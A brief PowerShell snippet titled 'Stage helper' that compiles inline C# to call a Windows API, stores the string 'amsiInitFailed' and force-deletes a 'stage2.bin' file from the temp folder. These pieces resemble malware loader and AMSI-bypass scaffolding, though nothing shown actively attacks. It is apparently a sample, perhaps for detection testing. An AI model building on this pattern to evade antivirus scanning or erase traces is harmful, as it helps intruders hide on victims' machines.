# Stage helper
$NativeCode = 'using System; using System.Runtime.InteropServices; public static class NativeApi { [DllImport("kernel32.dll")] public static extern uint GetCurrentProcessId(); }'
Add-Type -TypeDefinition $NativeCode -Language CSharp
$StageResult = [NativeApi]::GetCurrentProcessId()
$AmsiMarker = "amsiInitFailed"
Write-Output "stage 8 initialized"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
